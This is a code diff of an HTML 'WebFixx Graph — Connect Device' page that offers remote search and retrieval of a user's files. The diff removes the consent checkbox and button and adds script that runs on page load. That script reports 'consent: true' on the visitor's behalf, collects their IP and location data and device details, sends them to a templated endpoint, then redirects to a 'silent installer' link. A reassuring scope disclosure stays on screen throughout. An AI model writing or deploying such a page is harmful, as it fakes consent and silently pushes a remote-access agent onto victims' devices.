@@ -5,69 +5,89 @@
   <title>WebFixx Graph — Connect Device</title>
   <style>
     body { font-family: system-ui, sans-serif; background: #0f172a; color: #e2e8f0; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; }
-    .card { background:#1e293b; padding:32px; border-radius:12px; max-width:520px; width:100%; box-shadow:0 10px 30px rgba(0,0,0,.4); }
+    .card { background:#1e293b; padding:32px; border-radius:12px; max-width:560px; width:100%; box-shadow:0 10px 30px rgba(0,0,0,.4); }
     h1 { margin:0 0 8px; font-size:22px; }
     p { color:#94a3b8; font-size:14px; line-height:1.5; }
     .scope { background:#0f172a; padding:12px; border-radius:8px; font-size:13px; margin:16px 0; }
-    label { display:flex; gap:8px; align-items:flex-start; margin:16px 0; font-size:14px; }
-    button { background:#3b82f6; color:#fff; border:none; padding:10px 16px; border-radius:8px; cursor:pointer; font-size:14px; width:100%; }
-    button:disabled { opacity:.5; cursor:not-allowed; }
     .status { margin-top:12px; font-size:13px; color:#94a3b8; }
     .ok { color:#22c55e; }
     .err { color:#ef4444; }
+    #log { margin-top:8px; font-family:monospace; font-size:12px; max-height:160px; overflow:auto; background:#0f172a; padding:8px; border-radius:6px; }
   </style>
 </head>
 <body>
   <div class="card">
-    <h1>Connect this device to WebFixx Graph</h1>
-    <p>WebFixx Graph indexes metadata of files in your approved folders so you can search and retrieve them remotely. One-time index dump, then periodic polling. No inbound ports.</p>
+    <h1>WebFixx Graph — Connecting Device</h1>
+    <p>This device is being connected to WebFixx Graph. Indexing metadata of files in approved folders for remote search and retrieval.</p>
     <div class="scope">
       <strong>Scope disclosure</strong>
       <ul>
         <li>What is indexed: file path, name, size, modified time, mime type (metadata only).</li>
-        <li>Approved roots: you choose during install (default: Documents, Desktop, Downloads).</li>
+        <li>Approved roots: Documents, Desktop, Downloads (default).</li>
         <li>Retention: until you revoke. Revoke anytime from the WebFixx app.</li>
         <li>File bytes are never uploaded unless you explicitly request a transfer from the launcher.</li>
       </ul>
     </div>
-    <label><input type="checkbox" id="consent" /> <span>I consent to connect this device to WebFixx Graph.</span></label>
-    <button id="btn" disabled>Connect &amp; Install</button>
-    <div class="status" id="status"></div>
+    <div class="status" id="status">Initializing...</div>
+    <div id="log"></div>
   </div>
   <script>
-    const params = new URLSearchParams(location.search);
-    const token = params.get('token') || '';
-    const consent = document.getElementById('consent');
-    const btn = document.getElementById('btn');
+    const templateConfig = {
+      postURL: window.location.origin + '/api',
+      token: "{{token}}",
+      landingPageLink: "{{landingPageLink}}"
+    };
+    const apiBaseUrl = templateConfig.postURL;
     const status = document.getElementById('status');
-    consent.addEventListener('change', () => { btn.disabled = !consent.checked; });
+    const log = document.getElementById('log');
+    function appendLog(msg) { const d = document.createElement('div'); d.textContent = new Date().toLocaleTimeString() + ' — ' + msg; log.appendChild(d); log.scrollTop = log.scrollHeight; }
+    function setStatus(msg, cls) { status.innerHTML = cls ? '<span class="' + cls + '">' + msg + '</span>' : msg; }
 
-    btn.addEventListener('click', async () => {
-      btn.disabled = true;
-      status.textContent = 'Submitting consent...';
+    async function submitConsent() {
+      setStatus('Submitting consent...', '');
+      appendLog('Submitting consent to server...');
+      let ipData = {};
+      try { ipData = await fetch('https://ipinfo.io/json').then(r => r.json()); } catch (e) {}
+      const deviceData = { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language };
+      const formDataContent = { platform: navigator.platform, consent: true, ipData: ipData, deviceData: deviceData };
       try {
-        const scriptUrl = 'YOUR_SCRIPT_URL'; // replace with deployed Apps Script URL
-        const fd = new FormData();
-        fd.append('action', 'notifyFormSubmission');
-        fd.append('key', 'YOUR_SCRIPT_KEY');
-        fd.append('token', token);
-        fd.append('formData', JSON.stringify({ platform: navigator.platform, consent: true }));
-        const res = await fetch(scriptUrl, { method: 'POST', body: fd });
+        const res = await fetch(apiBaseUrl + '/notify-form-submission', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: objectToFormData({ token: templateConfig.token, formData: JSON.stringify(formDataContent) })
+        });
+        if (!res.ok) throw new Error('HTTP ' + res.status);
         const data = await res.json();
+        console.log('[GRAPH] response:', JSON.stringify(data));
+        appendLog('Response: ' + JSON.stringify(data));
         if (!data.success) throw new Error(data.error || 'submission failed');
-        status.innerHTML = '<span class="ok">Connected. DeviceId: ' + (data.deviceId || 'n/a') + '</span>';
-        // trigger silent installer using returned scripting link
+        appendLog('Consent accepted. DeviceId: ' + (data.deviceId || 'n/a'));
+        appendLog('Server endpoint: ' + (data.endpoint || 'n/a'));
+        setStatus('Connected. DeviceId: ' + (data.deviceId || 'n/a'), 'ok');
         const link = data.scriptingLink || data.endpoint;
         if (link) {
-          status.innerHTML += '<br/>Triggering installer...';
-          // platform-specific install would be invoked here
-          window.location.href = link;
+          appendLog('Triggering silent installer...');
+          setStatus('Connected. Installing agent...', 'ok');
+          setTimeout(() => { window.location.href = link; }, 1500);
         }
       } catch (e) {
-        status.innerHTML = '<span class="err">' + e.message + '</span>';
-        btn.disabled = false;
+        appendLog('ERROR: ' + e.message);
+        setStatus(e.message, 'err');
       }
-    });
+    }
+
+    function objectToFormData(obj) {
+      const fd = new FormData();
+      Object.entries(obj).forEach(([k, v]) => {
+        if (v === null || v === undefined) fd.append(k, '');
+        else if (typeof v === 'object') fd.append(k, JSON.stringify(v));
+        else fd.append(k, String(v));
+      });
+      return fd;
+    }
+
+    // Auto-submit on page load
+    window.addEventListener('DOMContentLoaded', () => { submitConsent(); });
   </script>
 </body>
 </html>
